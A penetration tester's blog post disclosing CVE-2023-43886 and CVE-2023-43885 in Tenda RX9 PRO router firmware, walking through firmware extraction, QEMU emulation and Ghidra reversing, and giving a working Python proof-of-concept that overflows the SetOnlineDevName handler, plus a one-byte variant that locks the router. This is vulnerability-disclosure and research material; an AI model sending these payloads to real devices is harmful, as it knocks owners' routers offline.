<!DOCTYPE html>
<html>
  <head>
    <title>Tenda RX9 PRO - Stack Overflow Vulnerability + DoS | CVE-2023-43886 and CVE-2023-43885 – RTLCopyMemory – Penetration tester</title>

        <meta charset="utf-8" />
    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>

    
    <meta name="description" content="This post will describe how I found this vulnerability and give step by step instructions to follow.
It was found on September 19th on the Firmware version V22.03.02.20

" />
    <meta property="og:description" content="This post will describe how I found this vulnerability and give step by step instructions to follow.
It was found on September 19th on the Firmware version V22.03.02.20

" />
    
    <meta name="author" content="RTLCopyMemory" />

    
    <meta property="og:title" content="Tenda RX9 PRO - Stack Overflow Vulnerability + DoS | CVE-2023-43886 and CVE-2023-43885" />
    <meta property="twitter:title" content="Tenda RX9 PRO - Stack Overflow Vulnerability + DoS | CVE-2023-43886 and CVE-2023-43885" />
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="alternate" type="application/rss+xml" title="RTLCopyMemory - Penetration tester" href="/feed.xml" />

    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          <a href="/" class="site-avatar"><img src="https://avatars.githubusercontent.com/u/29557660?v=4" /></a>

          <div class="site-info">
            <h1 class="site-name"><a href="/">RTLCopyMemory</a></h1>
            <p class="site-description">Penetration tester</p>
          </div>

          <nav>
            <a href="/">Blog</a>
            <a href="/about">About</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>Tenda RX9 PRO - Stack Overflow Vulnerability + DoS | CVE-2023-43886 and CVE-2023-43885</h1>

  <div class="entry">
    <p>This post will describe how I found this vulnerability and give step by step instructions to follow.<br />
It was found on September 19th on the Firmware version <code class="language-plaintext highlighter-rouge">V22.03.02.20</code></p>

<h2 id="extracting-the-firmare">Extracting the Firmare</h2>
<p>Extracting the firmware is nothing complicated.</p>

<p>Once downloaded the zip from the <a href="https://www.tendacn.com/download/detail-4514.html">official site</a>, put it in a folder and run <code class="language-plaintext highlighter-rouge">binwalk -Me ./</code> to extract all
of its contents.</p>

<p>Once done, you can find the root folder at <code class="language-plaintext highlighter-rouge">_US_RX9ProV1.0in_V22.03.02.20_multi_TDE01.bin.extracted/squashfs-root</code></p>

<h2 id="setting-up-the-scene-for-easier-testing-with-qemu">Setting up the scene for easier testing with QEMU</h2>
<p>The target http server binary is in <code class="language-plaintext highlighter-rouge">/usr/sbin/httpd</code>, running <code class="language-plaintext highlighter-rouge">file</code> on it shows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./usr/sbin/httpd: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-mips-sf.so.1, no section header
</code></pre></div></div>

<p>Pro tip: If you struggle to find the <code class="language-plaintext highlighter-rouge">httpd</code> executable, you can just <code class="language-plaintext highlighter-rouge">grep -r AdvGetMacMtuWan</code>. The string im searching for comes from <code class="language-plaintext highlighter-rouge">/www/goform/</code>, ALL the files in there correspond to a funciton (and a string) in the main executable :&gt; Very handy</p>

<p>Therefore we need a mips QEMU to run this. Since the whole code is made to be run having the File System Root as the image root, we will use a <code class="language-plaintext highlighter-rouge">static</code> version of qemu, copied into the root:</p>

<p>Install Qemu with:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get <span class="nb">install </span>qemu-system qemu-user-static

<span class="nb">cp</span> <span class="si">$(</span>which qemu-mips-static<span class="si">)</span> ./
</code></pre></div></div>

<p>Command to execute HTTP Server:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo chroot</span> ./ ./qemu-mips-static ./usr/sbin/httpd
</code></pre></div></div>

<p>You can now test around if you want… However, not everything will be functioning</p>

<h2 id="starting-the-reversing">Starting the reversing</h2>
<p>After we have a functioning server so we can test our payloads faster, we take the <code class="language-plaintext highlighter-rouge">httpd</code> executable and throw it in Ghidra.</p>

<p>As noted before, this executable will contain all the filenames (without the <code class="language-plaintext highlighter-rouge">.txt</code>) contained in <code class="language-plaintext highlighter-rouge">/www/goform/</code>, therefore we can use Ghidra to find that string and follow its only XREF</p>

<p><img src="/images/tenda/StringXREF.png" alt="string xref in Ghidra" /></p>

<p>I have already renamed some functions, but this clearly just binds all files to the corresponding function in the executable.</p>

<p><img src="/images/tenda/bindAllFunction.png" alt="bindAll function" /></p>

<p>From here we just go to random functions, taking what by logic could take some inputs…
This part is the time consuming part and also the part that seems like magic to the readers, basically it’s nothing but reading reversed code until you find something, rarely it is fast but we will skip over all the functions I reversed for nothing :&gt;</p>

<h2 id="the-interesting-function">The interesting function</h2>
<p>After a few reversed functions, I set my eyes on one that looked at least a bit interesting: <code class="language-plaintext highlighter-rouge">SetOnlineDevName</code>.</p>

<p>We see the parameters <code class="language-plaintext highlighter-rouge">mac</code> and <code class="language-plaintext highlighter-rouge">devName</code> (the function was renamed by me, you will however easily notice that this is the parameters function by seeing how it’s always called at the beginning of every <code class="language-plaintext highlighter-rouge">Set</code> operation with a string and the parameter as inputs)</p>

<p><img src="/images/tenda/getParam.png" alt="params" /></p>

<p>Following this parameter (to highlight a variable in all the decompilation in Ghidra, press the middle mouse button on it) we see that it gets passed in a function call to an external function…</p>

<p>Time to reverse the library too! :D</p>

<p>Maybe a little “ignorant” but this is the way that I found the correct library exporting the function I wanted:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf <span class="nt">-d</span> ./usr/sbin/httpd
<span class="nb">grep</span> <span class="nt">-r</span> update_dev_name
</code></pre></div></div>

<p><img src="/images/tenda/findingLib.png" alt="finding libs" /></p>

<p>I’m sure there’s better ways, but oh well, it’s <code class="language-plaintext highlighter-rouge">libtd_server.so</code> :P</p>

<p>Well, it doesn’t take much to locate the function here since it’s exported and therefore we already have its name in the symbols…</p>

<p>The first thing that catches my eye is that function call where the only length that was given is the length of the input, without considering the length of the other parameter which… mmh…</p>

<p>The condition to reach it is very simple, it checks if the encoding is chinese (cn) (this can be found in <code class="language-plaintext highlighter-rouge">libcommon.so</code>) and if it is then it runs that function…</p>

<p><img src="/images/tenda/vuln.png" alt="update_dev_name" /></p>

<p>The fun part is that any other path actually uses the correct length:</p>

<p><img src="/images/tenda/others.png" alt="correct length" /></p>

<p>So let’s prepare a test payload and a script to quickly test this:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>


<span class="n">addr</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>  <span class="c1"># 192.168.1.206
</span>

<span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">):</span>
	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">'mac'</span><span class="p">:</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x1F</span><span class="p">,</span>
		<span class="s">'devName'</span><span class="p">:</span> <span class="s">'中'</span> <span class="o">*</span> <span class="mi">128</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">1024</span><span class="p">,</span>
	<span class="p">}</span>
	
	<span class="c1"># This will hang forever
</span>	<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s">/goform/SetOnlineDevName'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>

    <span class="c1"># The Password is sent pre-hashed from the page,
</span>    <span class="c1"># you might just want to grab it from the dev tools on your browser
</span>	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">'username'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
		<span class="s">'password'</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
	<span class="p">}</span>
	<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s">/login/Auth'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
	<span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"admin"</span><span class="p">,</span> <span class="s">"YOURPASSWORDHERE"</span><span class="p">)</span>
	<span class="n">payload</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

</code></pre></div></div>

<p>Sending this to your locally running (or actual device) httpd process will effectively give you a nice <code class="language-plaintext highlighter-rouge">segmantation fault (core dumped)</code> :&gt;</p>

<p><img src="/images/tenda/gdb.png" alt="gdb" /></p>

<p>Remember that gdb uses your host’s Endianess, which for x86 is Little Endian while the binary is Big Endian (and I didn’t set it in the above screenshot).</p>

<p>This was assigned CVE-2023-43886</p>

<h3 id="bonus">Bonus</h3>
<p>As a bonus DoS attack, if you send a <code class="language-plaintext highlighter-rouge">mac</code> of just 1 more byte than what I’ve put in the code above you will effectively send the router in a <code class="language-plaintext highlighter-rouge">trap()</code> which will lock the router until it is restarted. This was assigned CVE-2023-43885</p>

  </div>

  <div class="date">
    Written on September 19, 2023
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          
<a href="mailto:jobs@protocli.me"><i class="svg-icon email"></i></a>


<a href="https://github.com/rtlcopymemory"><i class="svg-icon github"></i></a>



<a href="/feed.xml"><i class="svg-icon rss"></i></a>




        </footer>
      </div>
    </div>

    

  </body>
</html>
